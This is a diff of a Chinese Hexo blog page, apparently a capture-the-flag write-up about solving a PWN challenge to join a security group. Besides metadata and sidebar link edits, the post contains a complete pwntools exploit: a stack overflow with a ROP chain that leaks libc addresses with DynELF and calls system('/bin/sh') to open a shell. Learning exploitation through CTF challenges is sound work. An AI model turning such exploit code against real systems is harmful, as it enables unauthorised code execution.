@@ -81,17 +81,17 @@
 
 
 
-<meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点 为了入群做题">
+<meta name="description" content="想学习，必要了解各位师傅，必入群">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN">
+<meta property="og:title" content="PWN为了入群做题">
 <meta property="og:url" content="http://yoursite.com/2017/11/03/pwn_ruqun/index.html">
 <meta property="og:site_name" content="ESE&#39;s Note">
-<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点 为了入群做题">
+<meta property="og:description" content="想学习，必要了解各位师傅，必入群">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-03T07:51:32.737Z">
+<meta property="og:updated_time" content="2017-11-09T11:41:20.593Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN">
-<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点 为了入群做题">
+<meta name="twitter:title" content="PWN为了入群做题">
+<meta name="twitter:description" content="想学习，必要了解各位师傅，必入群">
 
 
 
@@ -127,7 +127,7 @@
 
 
 
-  <title>PWN | ESE's Note</title>
+  <title>PWN为了入群做题 | ESE's Note</title>
   
 
 
@@ -257,7 +257,7 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/03/pwn_ruqun/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ESE">
+      <meta itemprop="name" content="">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.png">
     </span>
@@ -271,7 +271,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">PWN</h1>
+          <h1 class="post-title" itemprop="name headline">PWN为了入群做题</h1>
         
 
         <div class="post-meta">
@@ -325,8 +325,7 @@
       
 
       
-        <p>记录每天的进步，只有努力不会背叛自己！每天学习一点</p>
-<h1 id="为了入群做题"><a href="#为了入群做题" class="headerlink" title="为了入群做题"></a>为了入群做题</h1><a id="more"></a>
+        <p>想学习，必要了解各位师傅，必入群<br><a id="more"></a></p>
 <h2 id="1、入群"><a href="#1、入群" class="headerlink" title="1、入群"></a>1、入群</h2><p>链接：<a href="http://pan.baidu.com/s/1qY4wyoW" target="_blank" rel="external">http://pan.baidu.com/s/1qY4wyoW</a> 密码：46d4<br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf=ELF(&apos;pwn&apos;)</div><div class="line">get_got = elf.got[&apos;fgets&apos;]</div><div class="line">puts_plt = elf.plt[&apos;puts&apos;]</div><div class="line">puts_got = elf.got[&apos;puts&apos;]</div><div class="line">main = elf.symbols[&apos;main&apos;]</div><div class="line"></div><div class="line">bss = 0x6020b0</div><div class="line">ppprdi=0x401ab0</div><div class="line">        </div><div class="line">p = process(&apos;pwn&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line">#gdb.attach(p,&apos;&apos;&apos;b *0x4019ea &apos;&apos;&apos;)</div><div class="line"></div><div class="line">def peek(addr):</div><div class="line">    rop = p64(ppprdi) +p64(addr) +p64(1)+p64(1) + p64(puts_plt) + p64(main)</div><div class="line">    p.sendline(&apos;A&apos;*40+ rop)</div><div class="line">    str = p.recvuntil(&apos;&gt; &apos;)</div><div class="line">    result = str.split(&apos;\ncallme&apos;)[0]</div><div class="line">    if result == &apos;&apos;:</div><div class="line">        return &apos;\x00&apos;</div><div class="line">    return result</div><div class="line"></div><div class="line">d = DynELF(peek, elf=elf)</div><div class="line">system = int(d.lookup(&apos;system&apos;, &apos;libc&apos;))</div><div class="line">gets = int(d.lookup(&apos;gets&apos;, &apos;libc&apos;))</div><div class="line"></div><div class="line"></div><div class="line">rop = p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(gets) + p64(main)</div><div class="line">payload = &quot;A&quot;*40 + rop</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(&apos;/bin/sh\0&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line"></div><div class="line">rop=p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(system) + p64(0xdeadbeef)</div><div class="line">payload = &quot;A&quot;*40+ rop</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
 <p>之后是什么、、、、说好的flag呢？<br>哇还有东西，居然还有都行，居然是.dat文件</p>
 <p>害怕-恐怖</p>
@@ -372,8 +371,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/01/re_doxc_exe/" rel="next" title="RE_exe_docx">
-                <i class="fa fa-chevron-left"></i> RE_exe_docx
+              <a href="/2017/11/01/re_doxc_exe/" rel="next" title="RE_病毒分析">
+                <i class="fa fa-chevron-left"></i> RE_病毒分析
               </a>
             
           </div>
@@ -382,8 +381,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/11/05/re_suanfa/" rel="prev" title="RE">
-                RE <i class="fa fa-chevron-right"></i>
+              <a href="/2017/11/05/re_suanfa/" rel="prev" title="RE--某秋的比赛">
+                RE--某秋的比赛 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -452,9 +451,9 @@
             
               <img class="site-author-image" itemprop="image"
                 src="/images/avatar.png"
-                alt="ESE" />
+                alt="" />
             
-              <p class="site-author-name" itemprop="name">ESE</p>
+              <p class="site-author-name" itemprop="name"></p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
@@ -490,21 +489,27 @@
             
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                  <a href="https://github.com/saucxs/" target="_blank" title="GitHub">
                     
                       <i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
-                  <a href="https://twitter.com/yourname" target="_blank" title="Twitter">
+                  <a href="https://weibo.com/" target="_blank" title="Twitter">
                     
                       <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/yourname" target="_blank" title="Zhihu">
+                  <a href="https://www.zhihu.com/people/ese-76-83/activities" target="_blank" title="Zhihu">
                     
-                      <i class="fa fa-fw fa-qq"></i>Zhihu</a>
+                      <i class="fa fa-fw fa-drupal"></i>Zhihu</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/5899672336/profile?topnav=1&wvr=6/&is_all=1" target="_blank" title="Weibo">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
                 </span>
               
             
@@ -515,10 +520,10 @@
 
           
           
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
               <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
+                <i class="fa  fa-fw fa-globe"></i>
+                
               </div>
               <ul class="links-of-blogroll-list">
                 
@@ -577,7 +582,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#为了入群做题"><span class="nav-number">1.</span> <span class="nav-text">为了入群做题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、入群"><span class="nav-number">1.1.</span> <span class="nav-text">1、入群</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"><span class="nav-number">1.2.</span> <span class="nav-text">这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、入群"><span class="nav-number">1.</span> <span class="nav-text">1、入群</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"><span class="nav-number">2.</span> <span class="nav-text">这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心</span></a></li></ol></div>
             
 
           </div>
@@ -602,7 +607,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">ESE</span>
+  <span class="author" itemprop="copyrightHolder"></span>
 
   
 </div>
@@ -621,7 +626,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共18.6k字</span>
+  <span class="post-count">博客全站共17.9k字</span>
 </div>
 
         
